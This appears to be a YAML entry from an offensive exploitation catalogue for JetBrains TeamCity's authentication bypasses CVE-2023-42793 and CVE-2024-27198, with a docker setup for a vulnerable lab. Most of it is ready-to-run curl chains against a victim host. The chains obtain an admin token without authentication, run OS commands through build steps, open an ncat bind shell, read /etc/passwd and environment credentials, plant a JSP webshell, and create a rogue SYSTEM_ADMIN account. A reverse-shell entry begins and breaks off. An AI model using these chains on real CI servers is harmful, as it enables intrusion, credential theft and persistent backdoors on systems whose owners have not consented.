---
comment: |
  JetBrains TeamCity is a Java-based CI/CD server. Two critical authentication bypass
  vulnerabilities have CISA KEV status:

  1. CVE-2023-42793 (CVSS 9.8, CISA KEV): The /app/rest/users/id:1/tokens/RPC2 endpoint
     accepts unauthenticated POST requests and creates an API token for the administrator
     account (user id:1). The token grants full REST API access, enabling admin account
     creation, project/build manipulation, and OS command execution via a build runner.
     Affects TeamCity before 2023.05.4.

  2. CVE-2024-27198 (CVSS 9.8, CISA KEV): Authentication bypass via servlet path traversal
     using a semicolon suffix (e.g., /app/rest/users;.jsp). Allows unauthenticated creation
     of administrator accounts. Affects TeamCity before 2023.11.4 and before 2024.03.

  Build steps run on the TeamCity Build Agent. In default/lab deployments the agent shares
  the same host as the server. In production, agents may be on separate machines.
docker:
  compose: "services:\n  teamcity:\n    image: jetbrains/teamcity-server:2023.05.3\n\
    \    ports:\n      - \"8111:8111\"\n    volumes:\n      - teamcity_data:/data/teamcity_server/datadir\n\
    \      - teamcity_logs:/opt/teamcity/logs\n  teamcity-agent:\n    image: jetbrains/teamcity-agent:2023.05.3\n\
    \    environment:\n      SERVER_URL: http://teamcity:8111\n    depends_on:\n \
    \     - teamcity\nvolumes:\n  teamcity_data:\n  teamcity_logs:\n"
  note: "Starts TeamCity 2023.05.3 (vulnerable to CVE-2023-42793 unauthenticated auth\
    \ bypass).\nAccess at `http://localhost:8111`. On first visit, accept the license\
    \ and complete\nminimal setup (skip agent configuration). The REST API is active\
    \ immediately.\nRun `docker compose up -d && sleep 30` before sending requests.\n\
    Download the built-in agent token-creation PoC:\n  curl -s -X POST http://localhost:8111/app/rest/users/id:1/tokens/RPC2\n"
functions:
  bind-shell:
  - blind: true
    code: |
      # CVE-2023-42793: bind shell via Command Line build step (Linux agent)
      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
        -H "Content-Type: application/json" \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"name":"b","id":"b","parentProject":{"locator":"_Root"}}'

      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"name":"b","id":"B_B","project":{"id":"b"}}'

      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:B_B/steps" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"type":"simpleRunner","name":"bs","properties":{"property":[{"name":"use.custom.script","value":"true"},{"name":"script.content","value":"ncat -lvp 12345 -e /bin/sh &"}]}}'

      curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"buildType":{"id":"B_B"}}'
    comment: |
      CVE-2023-42793: opens a bind shell on TCP 12345 via a build step using ncat.
      The trailing & prevents the build step from blocking. Connect with: nc victim.com 12345
      Requires ncat (nmap package) on the agent host.
    connector: tcp-client
    contexts:
      unauthenticated:
    platform: linux
    tty: false
    version: |
      < 2023.05.4
  file-read:
  - code: |
      # Read server-side files via a build step that uploads output as an artifact
      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
        -H "Content-Type: application/json" \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

      # Create project and build type with file-read step and artifact rule
      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"name":"fr","id":"fr","parentProject":{"locator":"_Root"}}'

      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"name":"fr","id":"Fr_Fr","project":{"id":"fr"},"settings":{"property":[{"name":"artifactRules","value":"output.txt"}]}}'

      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:Fr_Fr/steps" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"type":"simpleRunner","name":"read","properties":{"property":[{"name":"use.custom.script","value":"true"},{"name":"script.content","value":"cat /etc/passwd > output.txt\ncat /proc/1/environ >> output.txt"}]}}'

      BUILD_ID=$(curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"buildType":{"id":"Fr_Fr"}}' \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

      sleep 8
      # Download the artifact
      curl -s "http://victim.com:8111/app/rest/builds/id:${BUILD_ID}/artifacts/content/output.txt" \
        -H "Authorization: Bearer $TOKEN"
    comment: |
      CVE-2023-42793: exfiltrates files from the agent host by running a build step that
      writes file content to a build artifact. Artifacts are downloadable via the REST API
      without the build step needing network access to the attacker.
      Valuable agent-side files:
      - /etc/passwd, /proc/1/environ (host info, credentials in environment)
      - ~/.ssh/id_rsa (SSH keys of the agent user)
      - TeamCity agent config: /opt/buildagent/conf/buildAgent.properties (server URL, auth token)
    contexts:
      unauthenticated:
    version: |
      < 2023.05.4
  file-write:
  - code: |
      # CVE-2023-42793: write arbitrary files on the agent host via a build step
      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
        -H "Content-Type: application/json" \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"name":"fw","id":"fw","parentProject":{"locator":"_Root"}}'

      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"name":"fw","id":"Fw_Fw","project":{"id":"fw"}}'

      # Write a JSP webshell to the TeamCity server web root:
      SHELL='<%@ page import="java.io.*" %><%String c=request.getParameter("c");if(c!=null){String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);out.print(new String(p.getInputStream().readAllBytes()));}%>'

      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:Fw_Fw/steps" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d "{\"type\":\"simpleRunner\",\"name\":\"fw\",\"properties\":{\"property\":[{\"name\":\"use.custom.script\",\"value\":\"true\"},{\"name\":\"script.content\",\"value\":\"echo '${SHELL}' > /opt/teamcity/webapps/ROOT/shell.jsp\"}]}}"

      curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        -d '{"buildType":{"id":"Fw_Fw"}}'
    comment: "CVE-2023-42793: writes arbitrary files to the agent (or server if co-located)\
      \ via a\nCommand Line build step. The path /opt/teamcity/webapps/ROOT/ is the\
      \ TeamCity embedded\nTomcat web root \u2014 files dropped here are served directly\
      \ by the TeamCity HTTP listener.\nVerify the exact path with the file-read entry\
      \ targeting /proc/1/cmdline.\nAfter the build completes, access the webshell\
      \ at: http://victim.com:8111/shell.jsp?c=id\nIn production setups where the\
      \ agent runs on a separate host, adjust the path to a\nwriteable location on\
      \ the agent (e.g., /tmp, the agent workspace).\n"
    contexts:
      unauthenticated:
    version: |
      < 2023.05.4
  rce:
  - code: "# CVE-2023-42793: auth bypass \u2192 admin token \u2192 RCE via build runner\n\
      \n# Step 1: create an admin API token without authentication\nTOKEN=$(curl -s\
      \ -X POST \"http://victim.com:8111/app/rest/users/id:1/tokens/RPC2\" \\\n  -H\
      \ \"Content-Type: application/json\" \\\n  | python3 -c \"import sys,json; print(json.load(sys.stdin)['value'])\"\
      )\necho \"[*] Token: $TOKEN\"\n\n# Step 2: create a project\ncurl -s -X POST\
      \ \"http://victim.com:8111/app/rest/projects\" \\\n  -H \"Authorization: Bearer\
      \ $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"\
      exploit\",\"id\":\"exploit\",\"parentProject\":{\"locator\":\"_Root\"}}'\n\n\
      # Step 3: create a build configuration under the project\ncurl -s -X POST \"\
      http://victim.com:8111/app/rest/buildTypes\" \\\n  -H \"Authorization: Bearer\
      \ $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"\
      pwn\",\"id\":\"Exploit_Pwn\",\"project\":{\"id\":\"exploit\"}}'\n\n# Step 4:\
      \ add a Command Line build step with an OS command\ncurl -s -X POST \"http://victim.com:8111/app/rest/buildTypes/id:Exploit_Pwn/steps\"\
      \ \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\"\
      \ \\\n  -d '{\"type\":\"simpleRunner\",\"name\":\"cmd\",\"properties\":{\"property\"\
      :[{\"name\":\"use.custom.script\",\"value\":\"true\"},{\"name\":\"script.content\"\
      ,\"value\":\"id\\nhostname\\nenv\"}]}}'\n\n# Step 5: trigger the build and poll\
      \ for output\nBUILD_ID=$(curl -s -X POST \"http://victim.com:8111/app/rest/buildQueue\"\
      \ \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\"\
      \ \\\n  -d '{\"buildType\":{\"id\":\"Exploit_Pwn\"}}' \\\n  | python3 -c \"\
      import sys,json; print(json.load(sys.stdin)['id'])\")\n\nsleep 5\ncurl -s \"\
      http://victim.com:8111/app/rest/builds/id:${BUILD_ID}/log\" \\\n  -H \"Authorization:\
      \ Bearer $TOKEN\"\n"
    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2023-42793:\
      \ the token-creation endpoint for user id:1 does not enforce\nauthentication,\
      \ returning a valid admin Bearer token in the response JSON.\nThe build step\
      \ runs as the TeamCity Build Agent OS user on the agent host.\nIn default lab\
      \ setups the agent is co-located with the server.\nRef: https://www.exploit-db.com/exploits/51884\n\
      Metasploit: use exploit/multi/http/jetbrains_teamcity_rce_cve_2023_42793\nnuclei:\
      \ CVE-2023-42793\n"
    contexts:
      unauthenticated:
    version: |
      < 2023.05.4
  - code: "# CVE-2024-27198: auth bypass via semicolon path traversal \u2192 create\
      \ admin user\n# Step 1: create an administrator account without authentication\n\
      curl -s -X POST \"http://victim.com:8111/app/rest/users;.jsp\" \\\n  -H \"Content-Type:\
      \ application/json\" \\\n  -d '{\"username\":\"hacker\",\"password\":\"H@ck3r1!\"\
      ,\"email\":\"h@x.com\",\"roles\":{\"role\":[{\"roleId\":\"SYSTEM_ADMIN\",\"\
      scope\":\"g\"}]}}'\n\n# Step 2: use the new admin account to trigger RCE via\
      \ build runner (same steps as above)\ncurl -s -X POST \"http://victim.com:8111/app/rest/buildTypes\"\
      \ \\\n  -u \"hacker:H@ck3r1!\" \\\n  -H \"Content-Type: application/json\" \\\
      \n  -d '{\"name\":\"pwn\",\"id\":\"pwn2\",\"project\":{\"id\":\"_Root\"}}'\n"
    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2024-27198:\
      \ The TeamCity REST API does not properly reject requests where\nthe path contains\
      \ a semicolon suffix (;.jsp). The servlet container strips the\nsuffix before\
      \ routing but the authentication check uses the original path,\ncreating a bypass.\
      \ POST to /app/rest/users;.jsp creates an admin account.\nAfter account creation,\
      \ use the same build-runner RCE chain as CVE-2023-42793.\nRef: https://www.rapid7.com/blog/post/2024/03/04/cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/\n\
      nuclei: CVE-2024-27198\n"
    contexts:
      unauthenticated:
    version: |
      < 2023.11.4 / < 2024.03
  reverse-shell:
  - blind: true
    code: |
      # CVE-2023-42793: reverse shell via Command Line build step
      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
        -H "Content-Type: application/json" \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
